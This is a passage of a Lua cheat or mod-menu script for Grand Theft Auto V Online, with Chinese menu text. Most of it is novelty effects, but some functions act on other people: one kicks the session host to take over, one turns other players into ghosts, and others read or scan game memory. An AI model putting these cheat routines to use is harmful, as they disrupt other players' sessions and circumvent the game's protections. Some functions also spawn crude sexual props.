                            ENTITY.SET_ENTITY_HEADING(ped, ENTITY.GET_ENTITY_HEADING(players.user_ped()))
                            request_control_of_entity_once(ped)
                            ENTITY.ATTACH_ENTITY_TO_ENTITY(ped, players.user_ped(), 0, 0, 0, 1.3, 180, 180, -180, true, false, true, true, 0, true)
                            entity_held = ped
                        end 
                    end
                end
            else
                TASK.CLEAR_PED_TASKS_IMMEDIATELY(players.user_ped())
                are_hands_up = false
            end
        else
            if ENTITY.IS_ENTITY_A_PED(entity_held) then
                ENTITY.DETACH_ENTITY(entity_held)
                ENTITY.SET_ENTITY_ALPHA(entity_held, 255)
                PED.SET_PED_TO_RAGDOLL(entity_held, 10, 10, 0, false, false, false)
                --ENTITY.SET_ENTITY_VELOCITY(entity_held, 0, 100, 0)
                ENTITY.SET_ENTITY_MAX_SPEED(entity_held, 100.0)
                ENTITY.APPLY_FORCE_TO_ENTITY(entity_held, 1, 0, 100, 0, 0, 0, 0, 0, true, false, true, false, false)
                AUDIO.PLAY_PAIN(entity_held, 7, 0, 0)
                TASK.CLEAR_PED_TASKS_IMMEDIATELY(players.user_ped())
                ENTITY.FREEZE_ENTITY_POSITION(players.user_ped(), true)
                ENTITY.SET_ENTITY_NO_COLLISION_ENTITY(entity_held, players.user_ped(), false)
                request_anim_dict("melee@unarmed@streamed_core")
                TASK.TASK_PLAY_ANIM(players.user_ped(), "melee@unarmed@streamed_core", "heavy_punch_a", 8.0, 8.0, -1, 0, 0.3, false, false, false)
                util.yield(500)
                ENTITY.FREEZE_ENTITY_POSITION(players.user_ped(), false)
                entity_held = 0
                are_hands_up = false
            end
            -- toss
        end
    end
end

function pvpdefmode()
    for _, pid in ipairs(players.list(false, true, true)) do
        if PLAYER.IS_PLAYER_FREE_AIMING(pid) then
            NETWORK.SET_REMOTE_PLAYER_AS_GHOST(pid, true)
        else 
            NETWORK.SET_REMOTE_PLAYER_AS_GHOST(pid, false)
        end
    end
end

function IsPlayerUsingOrbitalCannon(player)
    return BitTest(memory.read_int(memory.script_global((2657589 + (player * 466 + 1) + 427))), 0) -- Global_2657589[PLAYER::PLAYER_ID() /*466*/].f_427), 0
end

function IsPlayerFlyingAnyDrone(player)
   return BitTest(memory.read_int(memory.script_global(1853910 + (player * 862 + 1) + 267 + 365)), 26) -- Global_1853910[PLAYER::PLAYER_ID() /*862*/].f_267.f_365, 26
end

function IsPlayerUsingGuidedMissile(player)
    return (memory.read_int(memory.script_global(2657589 + 1 + (player * 466) + 321 + 10)) ~= -1 and IsPlayerFlyingAnyDrone(player)) -- Global_2657589[PLAYER::PLAYER_ID() /*466*/].f_321.f_10 
end

function IsPlayerInRcBandito(player)
    return BitTest(memory.read_int(memory.script_global(1853348 + (player * 834 + 1) + 267 + 348)), 29)  -- Global_1853348[PLAYER::PLAYER_ID() /*834*/].f_267.f_348, 29
end

function IsPlayerInRcTank(player)
    return BitTest(memory.read_int(memory.script_global(1853348 + (player * 834 + 1) + 267 + 428 + 2)), 16) -- Global_1853910[PLAYER::PLAYER_ID() /*862*/].f_267.f_428.f_2
end

maxHealth_cantseeyouinmap = 328
function undead()
    if  ENTITY.GET_ENTITY_MAX_HEALTH(players.user_ped()) ~= 0 then
		ENTITY.SET_ENTITY_MAX_HEALTH(players.user_ped(), 0)
	end
end

function autoaccept()
    local message_hash = HUD.GET_WARNING_SCREEN_MESSAGE_HASH()
    if message_hash == 15890625 or message_hash == -398982408 or message_hash == -587688989 then
        PAD.SET_CONTROL_VALUE_NEXT_FRAME(2, 201, 1.0)
        util.yield(200)
    end
end

function autogethost()
	if not (players.get_host() == PLAYER.PLAYER_ID()) and not util.is_session_transition_active() then
		if not (PLAYER.GET_PLAYER_NAME(players.get_host()) == "**Invalid**") then
			menu.trigger_commands("kick"..PLAYER.GET_PLAYER_NAME(players.get_host()))
			util.yield(200)
		end
	end
end

local function clearBit(addr, bitIndex)
    memory.write_int(addr, memory.read_int(addr) & ~(1<<bitIndex))
end

function attach_to_player(hash, bone, x, y, z, xrot, yrot, zrot)           --attach object to player ped
    local user_ped = PLAYER.PLAYER_PED_ID()
    hash = util.joaat(hash)

    STREAMING.REQUEST_MODEL(hash)
    while not STREAMING.HAS_MODEL_LOADED(hash) do		
        util.yield()
    end
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(hash)

    local object = OBJECT.CREATE_OBJECT(hash, 0.0,0.0,0, true, true, false)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(object, user_ped, PED.GET_PED_BONE_INDEX(PLAYER.PLAYER_PED_ID(), bone), x, y, z, xrot, yrot, zrot, false, false, false, false, 2, true) 
end

function delete_object(model)
    local hash = util.joaat(model)
    for k, object in pairs(entities.get_all_objects_as_handles()) do
        if ENTITY.GET_ENTITY_MODEL(object) == hash then
            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(object, false, false) 
            entities.delete_by_handle(object)
        end
    end
end

function snowpeople(on)
    local zhangzi = "prop_gumball_03"
    local sonwman = "prop_prlg_snowpile"
    if on then
        attach_to_player(sonwman, 0, 0.0, 0, 0, 0, 0,0)
        attach_to_player(sonwman, 0, 0.0, 0, -0.5, 0, 0,0)
        attach_to_player(sonwman, 0, 0.0, 0, -1, 0, 0,0)
        attach_to_player(zhangzi, 0, 0.0, 0, 0, 0, 50,0)
        attach_to_player(zhangzi, 0, 0.0, 0, 0, 0, 125,0)
        attach_to_player(zhangzi, 0, 0.0, 0, 0, 0, -50,0)
        attach_to_player(zhangzi, 0, 0.0, 0, 0, 0, -125,0)
    else
        delete_object(sonwman)
        delete_object(zhangzi)
    end
end

local ped_flags = {}
function firepersonl(on)
    ped_flags[430] = on
    if on then
        menu.trigger_commands("godmode off")
        FIRE.START_ENTITY_FIRE(PLAYER.PLAYER_PED_ID())
        ENTITY.SET_ENTITY_PROOFS(players.user_ped(), false, true, false, false, false, false, 0, false)
        menu.trigger_commands("demigodmode on")
    else
        FIRE.STOP_ENTITY_FIRE(PLAYER.PLAYER_PED_ID())
        ENTITY.SET_ENTITY_PROOFS(players.user_ped(), false, false, false, false, false, false, 0, false)
        menu.trigger_commands("godmode on")
    end
end

function get_entities_in_player_range(pId, radius)
	local peds = get_peds_in_player_range(pId, radius)
	local vehicles = get_vehicles_in_player_range(pId, radius)
	local entities = peds
	for i = 1, #vehicles do table.insert(entities, vehicles[i]) end
	return entities
end

function request_fx_asset(asset)
	STREAMING.REQUEST_NAMED_PTFX_ASSET(asset)
	while not STREAMING.HAS_NAMED_PTFX_ASSET_LOADED(asset) do
		util.yield()
	end
end

Colour.new = function(R, G, B, A)
    return {r = R or 0, g = G or 0, b = B or 0, a = A or 0}
end

function personllight()
    local localPed = PLAYER.PLAYER_PED_ID()
    local fect = Effect.new("scr_xm_farm", "scr_xm_dst_elec_crackle")
    local effect = Effect.new("scr_ie_tw", "scr_impexp_tw_take_zone")
    local colour = Colour.new(5, 0, 0, 30)
    local colour2 = Colour.new(5, 50, 10, 30)
    request_fx_asset(effect.asset)
    GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
    GRAPHICS.SET_PARTICLE_FX_NON_LOOPED_COLOUR(colour.r, colour.g, colour.b)
    GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_ON_ENTITY(
        effect.name,
        localPed,
        0.0, 0.0, 0.75,
        0.0, 0.0, 0.0,
        0.09,
        false, false, false)
    GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
    GRAPHICS.SET_PARTICLE_FX_NON_LOOPED_COLOUR(colour2.r, colour2.g, colour2.b)
    GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_ON_ENTITY(
        effect.name,
        localPed,
        0.0, 0.0, -2.9,
        0.0, 0.0, 0.0,
        1.0,
        false, false, false)
end

function supermanpersonl()
	local pWeapon = memory.alloc_int()
	WEAPON.GET_CURRENT_PED_WEAPON(players.user_ped(), pWeapon, 1)
	local weaponHash = memory.read_int(pWeapon)
	if WEAPON.IS_PED_ARMED(players.user_ped(), 1) or weaponHash == util.joaat("weapon_unarmed") then
		local pImpactCoords = v3.new()
		local pos = ENTITY.GET_ENTITY_COORDS(players.user_ped(), false)
		if WEAPON.GET_PED_LAST_WEAPON_IMPACT_COORD(players.user_ped(), pImpactCoords) then
			set_explosion_proof(players.user_ped(), true)
			util.yield_once()
			FIRE.ADD_EXPLOSION(pos.x, pos.y, pos.z - 1.0, 29, 5.0, false, true, 0.3, true)
		elseif not FIRE.IS_EXPLOSION_IN_SPHERE(29, pos.x, pos.y, pos.z, 2.0) then
			set_explosion_proof(players.user_ped(), false)
		end
	end
end

function becomepoliceman()
    local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user_ped())
    PED.SET_PED_AS_COP(p, true)
    menu.trigger_commands("smycop01") --model cop
    menu.trigger_commands("police3") --spawn cop car
end


local agroup = "missfbi3ig_0"
local mshit = util.joaat("prop_big_shit_02")
local agroup2 = "switch@trevor@jerking_off"
local cum = util.joaat("p_oil_slick_01")
local anim2 = "trev_jerking_off_loop"
local anim = "shit_loop_trev"
function personlshit() 
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    c.z = c.z - 1
    while not STREAMING.HAS_ANIM_DICT_LOADED(agroup) do 
        STREAMING.REQUEST_ANIM_DICT(agroup)
        util.yield()
    end
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(players.user_ped())
    TASK.TASK_PLAY_ANIM(players.user_ped(), agroup, anim, 8.0, 8.0, 3000, 0, 0, true, true, true) --play anim
    util.yield(1000)
    local shit = entities.create_object(mshit, c) --spawn shit
    util.yield(60000)
    entities.delete_by_handle(shit) --delete shit
end

function personlhitplane() 
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    c.z = c.z - 1
    while not STREAMING.HAS_ANIM_DICT_LOADED(agroup2) do
        STREAMING.REQUEST_ANIM_DICT(agroup2)
        util.yield()
    end
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(players.user_ped())
    TASK.TASK_PLAY_ANIM(players.user_ped(), agroup2, anim2, 8.0, 8.0, 5000, 1, 0, true, true, true) --play anim
    util.yield(4500)
    local cum = entities.create_object(cum, c) --spawn cum
    util.yield(60000)
    entities.delete_by_handle(cum) --delete cum
end

local selectedOpt = 1
options_force  = {"推开", "摧毁"}
function forcefielddd()
    if selectedOpt == 1 then
		local entities = get_entities_in_player_range(players.user(), 10.0)
		local playerPos = players.get_position(players.user())
		for _, entity in ipairs(entities) do
			local entPos = ENTITY.GET_ENTITY_COORDS(entity, false)

			if not (ENTITY.IS_ENTITY_A_PED(entity) and PED.IS_PED_A_PLAYER(entity)) and
			PED.GET_VEHICLE_PED_IS_USING(players.user_ped()) ~= entity and request_control_once(entity) then
				local force = v3.new(entPos)
				force:sub(playerPos)
				force:normalise()
				if ENTITY.IS_ENTITY_A_PED(entity) then PED.SET_PED_TO_RAGDOLL(entity, 1000, 1000, 0, false, false, false) end
				ENTITY.APPLY_FORCE_TO_ENTITY(entity, 3, force.x,force.y,force.z, 0, 0, 0.5, 0, false, false, true, false, false)
			end
		end
	elseif selectedOpt == 2 then
		set_explosion_proof(players.user_ped(), true)
		local pos = ENTITY.GET_ENTITY_COORDS(players.user_ped(), false)
		FIRE.ADD_EXPLOSION(pos.x,pos.y,pos.z, 29, 5.0, false, true, 0.0, true)
	end
end

function forcefield_set(index)
    selectedOpt = index
end

state = 0
local notif_format = "按 左键 和 右键 来使用原力"
function jedmode()
    if state == 0 then
		notification(notif_format, HudColour.blue, "INPUT_ATTACK", "INPUT_AIM")
		local effect = Effect.new("scr_ie_tw", "scr_impexp_tw_take_zone")
		local colour = {r = 0.5, g = 0.0, b = 0.5, a = 1.0}
		request_fx_asset(effect.asset)
		GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
		GRAPHICS.SET_PARTICLE_FX_NON_LOOPED_COLOUR(colour.r, colour.g, colour.b)
		GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_ON_ENTITY(
			effect.name, players.user_ped(), 0.0, 0.0, -0.9,1.0, 1.0,1, 1.0, false, false, false
		)
		state = 1
	elseif state == 1 then
		PLAYER.DISABLE_PLAYER_FIRING(players.user(), true)
		PAD.DISABLE_CONTROL_ACTION(0, 25, true)
		PAD.DISABLE_CONTROL_ACTION(0, 68, true)
		PAD.DISABLE_CONTROL_ACTION(0, 91, true)
		local entities = get_ped_nearby_vehicles(players.user_ped())

		for _, vehicle in ipairs(entities) do
			if PED.IS_PED_IN_ANY_VEHICLE(players.user_ped(), false) and
			PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), false) == vehicle then
				continue
			end
			if PAD.IS_DISABLED_CONTROL_PRESSED(0, 24) and
			request_control_once(vehicle) then
				ENTITY.APPLY_FORCE_TO_ENTITY(vehicle, 1, 0.0, 0.0, 0.5, 1.0, 1.0,1, 0, false, false, true, false, false)

			elseif PAD.IS_DISABLED_CONTROL_PRESSED(0, 25) and
			request_control_once(vehicle) then
				ENTITY.APPLY_FORCE_TO_ENTITY(vehicle, 1, 0.0, 0.0, -70.0,1.0, 1.0,1, 0, false, false, true, false, false)
			end
		end
	end
end

object = 0
local format0 = "按 ~%s~ ~%s~ ~%s~ ~%s~ 来使用地毯式骑行"
local format1 = "按 ~%s~ 以移动得更快"
function carpetridexx()
    if state == 0 then
		local objHash = util.joaat("p_cs_beachtowel_01_s")
		request_model(objHash)
		STREAMING.REQUEST_ANIM_DICT("rcmcollect_paperleadinout@")
		while not STREAMING.HAS_ANIM_DICT_LOADED("rcmcollect_paperleadinout@") do
			util.yield_once()
		end
		local localPed = players.user_ped()
		local pos = ENTITY.GET_ENTITY_COORDS(localPed, false)
		TASK.CLEAR_PED_TASKS_IMMEDIATELY(localPed)
		object = entities.create_object(objHash, pos)
		ENTITY.ATTACH_ENTITY_TO_ENTITY(
			localPed, object, 0, 0, -0.2, 1.0, 1.0, 1.0,1, false, true, false, false, 0, true, false
		)
		ENTITY.SET_ENTITY_COMPLETELY_DISABLE_COLLISION(object, false, false)

		TASK.TASK_PLAY_ANIM(localPed, "rcmcollect_paperleadinout@", "meditiate_idle", 8.0, -8.0, -1, 1, 0.0, false, false, false)
        notification123:help(format0 .. ".\n" .. format1 .. '.', HudColour.black,
        "INPUT_MOVE_UP_ONLY", "INPUT_MOVE_DOWN_ONLY", "INPUT_VEH_JUMP", "INPUT_DUCK", "INPUT_VEH_MOVE_UP_ONLY")
		state = 1

	elseif state == 1 then
		HUD.DISPLAY_SNIPER_SCOPE_THIS_FRAME()
		local objPos = ENTITY.GET_ENTITY_COORDS(object, false)
		local camrot = CAM.GET_GAMEPLAY_CAM_ROT(0)
		ENTITY.SET_ENTITY_ROTATION(object, 0, 0, camrot.z, 0, true)
		local forwardV = ENTITY.GET_ENTITY_FORWARD_VECTOR(players.user_ped())
		forwardV.z = 0.0
		local delta = v3.new(0, 0, 0)
		local speed = 0.2
		if PAD.IS_CONTROL_PRESSED(0, 61) then
			speed = 1.5
		end
		if PAD.IS_CONTROL_PRESSED(0, 32) then
			delta = v3.new(forwardV)
			delta:mul(speed)
		end
		if PAD.IS_CONTROL_PRESSED(0, 130)  then
			delta = v3.new(forwardV)
			delta:mul(-speed)
		end
		if PAD.IS_DISABLED_CONTROL_PRESSED(0, 22) then
			delta.z = speed
		end
		if PAD.IS_CONTROL_PRESSED(0, 36) then
			delta.z = -speed
		end
		local newPos = v3.new(objPos)
		newPos:add(delta)
		ENTITY.SET_ENTITY_COORDS(object, newPos.x,newPos.y,newPos.z, false, false, false, false)
	end
end

function fingergun()
    for id, data in pairs(weapon_stuff) do
        local name = data[1]
        local weapon_name = data[2]
        local projectile = util.joaat(weapon_name)
        while not WEAPON.HAS_WEAPON_ASSET_LOADED(projectile) do
            WEAPON.REQUEST_WEAPON_ASSET(projectile, 31, false)
            util.yield(10)
        end
        menu.toggle(finger_thing, name, {}, "", function(state)
            toggled = state
            while toggled do
                if memory.read_int(memory.script_global(4521801 + 930)) == 3 then
                    memory.write_int(memory.script_global(4521801 + 935), NETWORK.GET_NETWORK_TIME())
                    local inst = v3.new()
                    v3.set(inst,CAM.GET_FINAL_RENDERED_CAM_ROT(2))
                    local tmp = v3.toDir(inst)
                    v3.set(inst, v3.get(tmp))
                    v3.mul(inst, 1000)
                    v3.set(tmp, CAM.GET_FINAL_RENDERED_CAM_COORD())
                    v3.add(inst, tmp)
                    local x, y, z = v3.get(inst)
                    local fingerPos = PED.GET_PED_BONE_COORDS(players.user_ped(), 0xff9, 1.0, 0, 0)
                    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS_IGNORE_ENTITY(fingerPos.x, fingerPos.y, fingerPos.z, x, y, z, 1, true, projectile, 0, true, false, 500.0, players.user_ped(), 0)
                end
                util.yield(100)
            end
            local pos = ENTITY.GET_ENTITY_COORDS(players.user_ped())
            MISC.CLEAR_AREA_OF_PROJECTILES(pos.x, pos.y, pos.z, 999999, 0)
        end)
    end
end

function bigpussy()
    if state == 0 then
		local objHash <const> = util.joaat("apa_mp_apa_y1_l1a")
		request_model(objHash)
		STREAMING.REQUEST_ANIM_DICT("rcmcollect_paperleadinout@")
		while not STREAMING.HAS_ANIM_DICT_LOADED("rcmcollect_paperleadinout@") do
			util.yield()
		end
		local localPed = PLAYER.PLAYER_PED_ID()
		local pos = ENTITY.GET_ENTITY_COORDS(localPed)
		TASK.CLEAR_PED_TASKS_IMMEDIATELY(localPed)
		object = entities.create_object(objHash, pos)
		ENTITY.ATTACH_ENTITY_TO_ENTITY(localPed, object, 0, 0, 4, 1.0, 0, 0, 0, false, true, false, false, 0, true)
		ENTITY.SET_ENTITY_COMPLETELY_DISABLE_COLLISION(object, false, false)	
		state = 1
	elseif state == 1 then
		HUD.DISPLAY_SNIPER_SCOPE_THIS_FRAME()
		local objPos = ENTITY.GET_ENTITY_COORDS(object)
		local camrot = CAM.GET_GAMEPLAY_CAM_ROT(0)
		ENTITY.SET_ENTITY_ROTATION(object, camrot.x, camrot.y, camrot.z, 0, true)
		local forwardV = ENTITY.GET_ENTITY_FORWARD_VECTOR(PLAYER.PLAYER_PED_ID())
		forwardV.z = 0.0
		local delta = v3.new(0, 0, 0)
		local speed = 0.2

		local newPos = v3.new(objPos)
		newPos:add(delta)
		ENTITY.SET_ENTITY_COORDS(object, newPos.x, newPos.y, newPos.z, false, false, false, false)
	end
end

------------------------------------
-------------视觉效果---------------
------------------------------------

function drunkmode(val)
    if val > 0 then
        CAM.SHAKE_GAMEPLAY_CAM("DRUNK_SHAKE", val)
        GRAPHICS.SET_TIMECYCLE_MODIFIER("Drunk")
    else
        GRAPHICS.SET_TIMECYCLE_MODIFIER("DEFAULT")
        CAM.SHAKE_GAMEPLAY_CAM("DRUNK_SHAKE", 0)
    end
end

function visual_setting()
    local visions = menu.list(visuals, "屏幕效果", {""}, "")
for id, data in pairs(effect_stuff) do
    local effect_name = data[1]
    local effect_thing = data[2]
    menu.toggle(visions, effect_name, {"screenvisual"}, "", function(toggled)
        if toggled then
            GRAPHICS.ANIMPOSTFX_PLAY(effect_thing, 5, true)
        else
            GRAPHICS.ANIMPOSTFX_STOP_ALL()
        end
    end)
end

local visual_fidelity = menu.list(visuals, "视觉增强", {}, "")
for id, data in pairs(visual_stuff) do
    local effect_name = data[1]
    local effect_thing = data[2]
    menu.toggle(visual_fidelity, effect_name, {""}, "", function(toggled)
        if toggled then
            GRAPHICS.SET_TIMECYCLE_MODIFIER(effect_thing)
            menu.trigger_commands("shader off")
        else
            GRAPHICS.SET_TIMECYCLE_MODIFIER("DEFAULT")
        end
    end)
end


local drug_mode = menu.list(visuals, "药物过滤器", {}, "")
for id, data in pairs(drugged_effects) do
    menu.toggle(drug_mode, data, {}, "", function(toggled)
        if toggled then
            GRAPHICS.SET_TIMECYCLE_MODIFIER(data)
            menu.trigger_commands("shader off")
        else
            GRAPHICS.SET_TIMECYCLE_MODIFIER("DEFAULT")
        end
    end)
end
end


------------------------------------
-------------载具选项---------------
------------------------------------
local get_vehicle_cam_relative_heading = function(vehicle)
	local camDir = CAM.GET_GAMEPLAY_CAM_ROT(0):toDir()
	local fwdVector = ENTITY.GET_ENTITY_FORWARD_VECTOR(vehicle)
	camDir.z, fwdVector.z = 0.0, 0.0
	local angle = math.acos(fwdVector:dot(camDir) / (#camDir * #fwdVector))
	return math.deg(angle)
end

local shoot_from_vehicle = function (vehicle, damage, weaponHash, ownerPed, isAudible, isVisible, speed, target, position)
	local min, max = v3.new(), v3.new()
	local offset
	MISC.GET_MODEL_DIMENSIONS(ENTITY.GET_ENTITY_MODEL(vehicle), min, max)
	if position == 0 then
		offset = v3.new(min.x, max.y + 0.25, 0.3)
	elseif position == 1 then
		offset = v3.new(min.x, min.y, 0.3)
	elseif position == 2 then
		offset = v3.new(max.x, max.y + 0.25, 0.3)
	elseif position == 3 then
		offset = v3.new(max.x, min.y, 0.3)
	else
		error("得到了意想不到的位置")
	end
	local a = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(vehicle, offset.x, offset.y, offset.z)
	local direction = ENTITY.GET_ENTITY_ROTATION(vehicle, 2):toDir()
	if get_vehicle_cam_relative_heading(vehicle) > 95.0 then
		direction:mul(-1)
	end
	local b = v3.new(direction)
	b:mul(300.0); b:add(a)

	MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS_IGNORE_ENTITY_NEW(
		a.x, a.y, a.z,
		b.x, b.y, b.z,
		damage,
		true,
		weaponHash,
		ownerPed,
		isAudible,
		not isVisible,
		speed,
		vehicle,
		false, false, target, false, 0, 0, 0
	)
end

function vehlaser()
    if PED.IS_PED_IN_ANY_VEHICLE(players.user_ped(), false) then
		local vehicle = get_vehicle_player_is_in(players.user())
		local min, max = v3.new(), v3.new()
		MISC.GET_MODEL_DIMENSIONS(ENTITY.GET_ENTITY_MODEL(vehicle), min, max)
		local startLeft = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(vehicle,  min.x, max.y, 0.0)
		local endLeft = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(vehicle, min.x, max.y + 25.0, 0.0)
		GRAPHICS.DRAW_LINE(startLeft.x, startLeft.y, startLeft.z, endLeft.x, endLeft.y, endLeft.z, 255, 0, 0, 150)

		local startRight = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(vehicle, max.x, max.y, 0.0)
		local endRight = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(vehicle, max.x, max.y + 25.0, 0)
		GRAPHICS.DRAW_LINE(startRight.x, startRight.y, startRight.z, endRight.x, endRight.y, endRight.z, 255, 0, 0, 150)
	end
end

VehicleWeapon = {modelName = "", timeBetweenShots = 0}
VehicleWeapon.__index = VehicleWeapon

function VehicleWeapon.new(modelName, timeBetweenShots)
	local instance = setmetatable({}, VehicleWeapon)
	instance.modelName = modelName
	instance.timeBetweenShots = timeBetweenShots
	return instance
end

local vehicleWeaponList <const> = {
	VehicleWeapon.new("weapon_vehicle_rocket", 220),
	VehicleWeapon.new("weapon_raypistol", 50),
	VehicleWeapon.new("weapon_firework", 220),
	VehicleWeapon.new("vehicle_weapon_tank", 220),
	VehicleWeapon.new("vehicle_weapon_player_lazer", 30)
}


state = 0
local timer <const> = newTimer()
local msg = "按 ~%s~ 使用载具武器"

function vehweapon_veh()
    local control = Config.controls.vehicleweapons
	if state == 0 or timer.elapsed() > 120000 then
		local controlName = table.find_if(Imputs_vehweapon, function(k, tbl)
			return tbl[2] == control
		end)
		assert(controlName, "未找到控件名称")
		util.show_corner_help(msg:format(controlName))
		state = 1
		timer.reset()
	end

	local selectedWeapon = vehicleWeaponList[selectedOpt]
	local vehicle = get_vehicle_player_is_in(players.user())
	local weaponHash <const> = util.joaat(selectedWeapon.modelName)
	request_weapon_asset(weaponHash)

	if not ENTITY.DOES_ENTITY_EXIST(vehicle) or not PAD.IS_CONTROL_PRESSED(0, control) or
	timer.elapsed() < selectedWeapon.timeBetweenShots then
		return
	elseif get_vehicle_cam_relative_heading(vehicle) < 95.0 then
		shoot_from_vehicle(vehicle, 200, weaponHash, players.user_ped(), true, true, 2000.0, 0, 0)
		shoot_from_vehicle(vehicle, 200, weaponHash, players.user_ped(), true, true, 2000.0, 0, 2)
		timer.reset()
	else
		shoot_from_vehicle(vehicle, 200, weaponHash, players.user_ped(), true, true, 2000.0, 0, 1)
		shoot_from_vehicle(vehicle, 200, weaponHash, players.user_ped(), true, true, 2000.0, 0, 3)
		timer.reset()
	end
end

function setvehweapon(index)
    selectedOpt = index 
end

state = 0
local hash_plane = util.joaat("weapon_airstrike_rocket")
local trans =
{
	MenuName = "空袭飞机",
	Help = "使用任何飞机或直升机进行空袭",
	CornerHelp = "按 ~%s~ 以使用空袭飞机",
	Notification = "空袭飞机可用于飞机和直升机",
	HelpText = "空袭飞机可用于飞机和直升机",
}

function airstrikeaicraft_plane()
local control = Config.controls.airstrikeaircraft
if state == 0 then
    local action_name = table.find_if(Imputs_vehweapon, function (k, tbl)
        return tbl[2] == control
    end)
    assert(action_name, "control name not found")
    notification123:help("空袭飞机可用于飞机和直升机")
    util.show_corner_help(trans.CornerHelp:format(action_name))
    state = 1
end

if PED.IS_PED_IN_FLYING_VEHICLE(players.user_ped()) and PAD.IS_CONTROL_PRESSED(2, control) and
timer.elapsed() > 800 then
    local vehicle = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), false)
    local vehPos = ENTITY.GET_ENTITY_COORDS(vehicle, false)
    local groundZ = get_ground_z(vehPos)
    local startTime = newTimer()

    util.create_tick_handler(function()
        util.yield(500)
        if vehPos.z - groundZ < 10.0 then
            return false
        end
        local pos = get_random_offset_in_range(vehPos, 0.0, 5.0)
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(
            pos.x, pos.y, pos.z - 3.0,
            pos.x, pos.y, groundZ,
            200,
            true,
            hash_plane,
            players.user_ped(), true, false, 1000.0
        )
        return startTime.elapsed() < 5000
    end)

    timer.reset()
    end
end

local NULL <const> = 0
subHandlingClasses =
{
	[0]  = "CBikeHandlingData",
	[1]  = "CFlyingHandlingData",
	[2]  = "CFlyingHandlingData2",
	[3]  = "CBoatHandlingData",
	[4]  = "CSeaPlaneHandlingData",
	[5]  = "CSubmarineHandlingData",
	[6]  = "CTrainHandlingData",
	[7]  = "CTrailerHandlingData",
	[8]  = "CCarHandlingData",
	[9]  = "CVehicleWeaponHandlingData",
	[10] = "CSpecialFlightHandlingData",
}

function get_sub_handling_type(subHandling)
	local funAddress = memory.read_long(memory.read_long(subHandling) + 16)
	return util.call_foreign_function(funAddress, subHandling)
end


function get_sub_handling_array(handlingData)
	local subHandlingArray = memory.read_long(handlingData + 0x158)
	local numSubHandling = memory.read_ushort(handlingData + 0x160)
	local arr = {}
	local index = 0
	local t = -1

	while true do
		local subHandling = memory.read_long(subHandlingArray + index * 8)
		if subHandling == NULL then
			goto NotFound
		end

		t = get_sub_handling_type(subHandling)
		if t >= 0 and t <= 10 then
			table.insert(arr, {type = t, address = subHandling})
		end

	::NotFound::
		index = index + 1
		if index >= numSubHandling then break end
	end

	return arr
end

local GetVehicleModelInfo = 0
---@diagnostic disable-next-line: undefined-global
memory_scan("GVMI", "48 89 5C 24 ? 57 48 83 EC 20 8B 8A ? ? ? ? 48 8B DA", function (address)
	GetVehicleModelInfo = memory.rip(address + 0x2A)
end)


local GetHandlingDataFromIndex = 0
---@diagnostic disable-next-line: undefined-global
memory_scan("GHDFI", "40 53 48 83 EC 30 48 8D 54 24 ? 0F 29 74 24 ?", function (address)
	GetHandlingDataFromIndex = memory.rip(address + 0x37)
end)

valiases_spawn = {}
function veh_spawn_see()
    local current_preview = nil
    local next_preview
    local image_preview
    local function rotation_to_direction(rotation)
        local adjusted_rotation =
        {
            x = (math.pi / 180) * rotation.x,
            y = (math.pi / 180) * rotation.y,
            z = (math.pi / 180) * rotation.z
        }
        local direction =
        {
            x = -math.sin(adjusted_rotation.z) * math.abs(math.cos(adjusted_rotation.x)),
            y =  math.cos(adjusted_rotation.z) * math.abs(math.cos(adjusted_rotation.x)),
            z =  math.sin(adjusted_rotation.x)
        }
        return direction
    end
    local function get_offset_from_camera(distance)
        local cam_rot = CAM.GET_FINAL_RENDERED_CAM_ROT(0)
        local cam_pos = CAM.GET_FINAL_RENDERED_CAM_COORD()
        local direction = rotation_to_direction(cam_rot)
        local destination =
        {
            x = cam_pos.x + direction.x * distance,
            y = cam_pos.y + direction.y * distance,
            z = cam_pos.z + direction.z * distance
        }
        return destination
    end

    local function update_preview_tick()
        if current_preview ~= nil then
            current_preview.position = get_offset_from_camera(current_preview.camera_distance)
            current_preview.rotation.z = current_preview.rotation.z + 2
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(
                    current_preview.handle,
                    current_preview.position.x,
                    current_preview.position.y,
                    current_preview.position.z,
                    true, false, false
            )
            ENTITY.SET_ENTITY_ROTATION(
                    current_preview.handle,
                    current_preview.rotation.x,
                    current_preview.rotation.y,
                    current_preview.rotation.z,
                    2, true
            )
            ENTITY.SET_ENTITY_COMPLETELY_DISABLE_COLLISION(current_preview.handle, false, true)
            ENTITY.SET_ENTITY_ALPHA(current_preview.handle, 206, false)
            ENTITY.FREEZE_ENTITY_POSITION(current_preview.handle, true)
        end
    end

    
    for alias, vehicle in pairs(VEHICLE_ALIASES) do
        local alias_menu_item = menu.action(valiases_spawn.vehicle_aliases, alias, {alias}, "Spawn "..vehicle, function(click_type, pid)
                local targets = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local tar1 = ENTITY.GET_ENTITY_COORDS(targets, true)
                valiases_spawn.veh = util.joaat(vehicle)

                if valiases_spawn.vehicle_alias then
